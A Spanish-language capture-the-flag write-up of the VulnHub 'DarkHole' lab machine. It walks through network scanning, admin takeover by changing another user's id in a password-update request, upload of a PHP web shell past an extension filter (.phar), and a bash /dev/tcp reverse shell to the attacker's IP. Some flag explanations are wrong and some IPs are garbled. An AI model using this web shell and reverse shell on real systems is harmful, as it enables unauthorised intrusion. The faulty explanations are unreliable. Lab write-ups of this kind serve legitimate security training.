---
title: VulnHub-DarkHole
---
<dt>WriteUp-CTF</dt>
<dd>Valente2023intuicion</dd>
<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>

# [](#header-1)1).Estructura del entorno de trabajo... 
*  Maquina victima DarkHole-VulnHub 192.168.1.72 VMware.
![imagen](/images/DarkHole/1.png)

![imagen](/images/DarkHole/2.png)

```js
#sudo arp-scan -I wlp2s0 ‒localnet

El comando arp-scan escanea una red LAN para determinar los direcciones IP y direcciones MAC que están en uso. 

El parámetro -I wlp2s0 especifica la interfaz de red a utilizar para realizar el escaneo.
El parámetro --localnet especifica que se deben escanear todas las direcciones IP en la subred local.
```
<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>

# [](#header-1)2).Descubrimiento y enumeracion de puertos con nmap... 

```js
#sudo nmap -p- ‒open -sS ‒min-rate 5000 -vvv -n -Pn 192.168.1.72 -oG allports

Los parámetros utilizados son:

-p- : Especifica un rango de puertos a escanear desde el puerto 1 hasta el 65535.
--open : Solo muestra los puertos abiertos. 
-sS : Especifica el uso del método de escaneo SYN
--min-rate 5000 : Especifica una tasa mínima de paquetes por segundo de 5000.
vvv : Especifica el nivel máximo de verbosidad para la salida.
-n : Suprime la resolución de nombres.
-Pn : Suprime la asunción de que todos los hosts están vivos.
-oG : Especifica el formato de salida como Grepabes
allports : Especifica el nombre del archivo de salida.   

El comando realiza un escaneo de puertos en el host con dirección IP "192.168.1.72" y 
muestra solo los puertos abiertos en un formato legible para grep con un nivel máximo de verbosidad.
```

![imagen](/images/DarkHole/4.png)

| PORT         | STATE             |SERVICE|
|:-------------|:------------------|:------|
| 22/TCP       | Open              | ssh   |
| 80/TCP       | Open              | http  |

```js
#nmap -sCV -p22,80 192.168.1.72 -oN targeted
"-sCV": indica que se realizará un escaneo de versión de los servicios en los puertos especificados.                                                                                                                                                                       "-p22,80": indica que solo se escanearán los puertos 22 y 80.                                                                                                                                                                                                                              "192.168.1.72": es la dirección IP del host que se escaneará.                                                                                                                                                                                                                                          
"-oN targeted": indica que el resultado delante escaneo se guardará en un archivo de texto plano llamado "targeted"
```
![imagen](/images/DarkHole/5.png)

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)3).Descubrimiento.

```js
#whatweb http://192.168.1.72 -v

El comando "whatweb http://192.168.1.72 -v" se ejecuta con el programa WhatWeb, que es una herramienta de detección de tecnología de Internet.
Esta herramienta escanea un sitio web y determina las tecnologías que se utilizan en su construcción.                                                                                                                                                                          
El parámetro "-v" se utiliza para especificar un nivel de verbosidad en el resultado del escaneo.
Con este parámetro, se proporcionará más información sobre cada tecnología identificada en el sitio web, incluyendo las versiones y las cabeceras HTTP utilizadas.
```
 
![imagen](/images/DarkHole/6.png)

- http://192.168.1.72
![imagen](/images/DarkHole/7.png)

`Es posible registrarnos en`
- http://192.1681.72/login.php

![imagen](/images/DarkHole/8.png)

`Aplicamos un ataque con gobuster utilizando el diccionario big.txt a la ip de el servicio HTTP`

![imagen](/images/DarkHole/9.png)

`Resultado exitoso.`

- http://192.1681.72/config/
![imagen](/images/DarkHole/10.png)

- http://192.1681.72/css
![imagen](/images/DarkHole/11.png)

- http://192.1681.72/js
![imagen](/images/DarkHole/12.png)

- http://192.1681.72/upload
![imagen](/images/DarkHole/13.png)

- http://192.1681.72/upload/d.jpg WTF
![imagen](/images/DarkHole/14.png)

`Anteriormente se mencionó que es posible agregar un usuario y acceder al servidor web. El panel de control contiene la opción de actualizar la contraseña, la cual debemos interceptar con la herramienta BurpSuite.`

![imagen](/images/DarkHole/15.png)

<dt>Burpsuite</dt>
<dd>Esta herramienta nos ayuda a el escaneo automatizado de vulnerabilidades,
la manipulación y la repetición de solicitudes y respuestas HTTP/S, la prueba
de inyección de código (como SQL injection y XSS), la interceptación 
de solicitudes y respuestas para el análisis manual, y la creación de pruebas
personalizadas.</dd>

![imagen](/images/DarkHole/16.png)

`El burpsuite nos arroja de manera muy directa el proseso que hace el servidor al actualizar una contraseña, de esto nos aprobecharemos suponiendo que "id=1 " pertenese al usuario admin si es que lo hubiera y cambiando su contraseña.`

![imagen](/images/DarkHole/admin.png)

`Sé consiguio el acceso como admin y ahora tenemos la posibilidad de subir un archivo. Presumiblemente, con ayuda de burpsuite interseptando la peticion podremos inyectar un comando .php ya que es evidente que esw una de las tecnologias utilizadas por este servidor, si esto tiene exito nos  mandarnos una shell a nuestra maquina`

```js
#<? php echo "<pre>" . shell_exec($_GET['cmd']) . "/pre"; ?>

Este código es un ejemplo de código vulnerable en PHP. Este script 
muestra el resultado de ejecutar un comando en el sistema operativo del  
servidor que lo ejecuta. El comando a ejecutar se pasa como un parámetro 
GET en la URL, lo que significa que un atacante podría proporcionar un 
comando malicioso para ejecutar en el servidor.
```
![imagen](/images/DarkHole/19.png)

`Subiremos el archivo .php para tratar de obtener una SHELL`

![imagen](/images/DarkHole/20.png)
![imagen](/images/DarkHole/21.png)

`La pagina tiene alguna proteccion y nos dice que no estan admitidos algunos formatos y otros si, al igualq ue con el cambio de contraseña. Podremos interseptar esta peticion con burpsuite.`

![imagen](/images/DarkHole/22.png)

`De igual forma burpsuite nos arroja informacion muy valiosa en este caso la forma en la que se intenta subir el archivo.`

- con Ctrl+i nos mandamos esta peticion al intruder y aplicamos un clear.

![imagen](/images/DarkHole/23.png)

- Fuseamos por la terminacion php.

![imagen](/images/DarkHole/24.png)

- y añadimos "php,php5,php3,php4,pht,phtm y phar" al payload 

![imagen](/images/DarkHole/25.png)
![imagen](/images/DarkHole/26.png)

`Subiendo casi la mayoria de nuestras opciones.`

![imagen](/images/DarkHole/27.png)

`Haciendo una peticion simple al codigo que acabamos de inyecctar, quin nos debuelve una respuesta positiva es el archibo .phar`
- 192.161.1.82/upload/bla.phar?cmd=whoami

![imagen](/images/DarkHole/28.png)

`Por otro lado nos pondremos en escuccha por el puerto 443 con netcat.`

<dt>Netcat</dt>
<dd>se puede utilizar para verificar la seguridad de una red, identificar
puertos abiertos, probar la conectividad de red y verificar la 
disponibilidad de servicios de red. También se puede utilizar 
para transferir archivos entre sistemas y realizar tareas de 
mantenimiento y resolución de problemas de red.</dd>

```js
#sudo nc -lvp 443
Inicia un servidor de escucha en el puerto 443 utilizando Netcat.

"-l" indica que Netcat se pondrá en modo de escucha.

"-v" habilita la salida detallada de la información, lo que permite ver lo que está sucediendo en tiempo real.

"-p" se utiliza para especificar el puerto en el que se escucharán las conexiones entrantes.
```

![imagen](/images/DarkHole/29.png)

`Hacemos nuestro primer intento de obtener una shell.`

```js
#http://192.168.1.82/upload/bla.phar?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.77/443 0>%261"

Este comando se utiliza para ejecutar un shell interactivo en la máquina
objetivo y establecer una conexión inversa con un atacante.

"http://192.168.1.82/upload/bla.phar" es la URL del archivo que se va a descargar desde el servidor.
   
"?cmd=" es un parámetro que se agrega al final de la URL que se utiliza para pasar comandos al archivo descargado.
   
"bash -c" es el comando que se va a pasar al archivo descargado, que indica que se va a ejecutar el siguiente comando en un subproceso de shell.
    
"bash -i" es el comando que se va a ejecutar en el subproceso de shell, lo que indica que se debe iniciar una sesión de shell interactiva.
   
">%26" se utiliza para redirigir la salida de error a la misma ubicación que la salida estándar. Esto permite que la conexión inversa se establezca correctamente.
   
"/dev/tcp/192.168.1.77/443" es la dirección IP y el puerto de destino para la conexión inversa. Esto indica que se va a conectar a un servidor en la dirección IP 192.168.1.77 en el puerto 443.
   
"0>%261" se utiliza para redirigir la entrada estándar a la misma ubicación que la salida estándar. Esto también permite que la conexión inversa se establezca correctamente.
```

![imagen](/images/DarkHole/30.png)

`Con esta peticion logramos una shell a nuestra maquina.`
- y con los iguientes comandos una shell totalmente funcional.

```js
#script /dev/null -c bash
se utiliza para iniciar una sesión de shell interactiva en modo de
registro sin guardar la salida en un archivo
   
"script" es un comando que se utiliza para registrar una sesión de shell en un archivo.
    
"/dev/null" es un dispositivo especial en el sistema de archivos de Unix que se utiliza para descartar la salida.
    
"-c bash" se utiliza para indicar que se debe ejecutar el comando "bash" en el registro.
```
- Ctrl+z 

```js
#stty raw -echo; fg

Este comando se puede utilizar para ocultar la entrada de teclado del 
usuario mientras se ejecuta un trabajo en segundo plano. Esto puede ser
útil en situaciones en las que el trabajo en segundo plano se está ejecutando
por un tiempo prolongado y se desea ocultar los detalles de la entrada del usuario.

"stty raw -echo" establece la terminal en modo "raw", lo que significa que los caracteres ingresados por el usuario se transmiten directamente a la terminal sin procesamiento previo. Además, el comando "-echo" se utiliza para desactivar la retroalimentación de teclado en la pantalla, lo que oculta los caracteres ingresados por el usuario.

"fg" se utiliza para continuar la ejecución de un trabajo suspendido en segundo plano en el primer plano.
```

```js
#reset xterm

Este comando, el emulador de terminal Xterm se restablece a sus valores predeterminados

"reset" es un comando de Unix/Linux que se utiliza para restablecer la
        terminal a su estado predeterminado, lo que significa que todas las 
        configuraciones de terminal y los caracteres en la pantalla se 
        borran y se restablecen a los valores predeterminados.

"xterm" es un emulador de terminal de Unix/Linux que se utiliza para proporcionar 
        una interfaz de usuario en modo texto a través de una conexión 
        de red o en una sesión de terminal local.
```

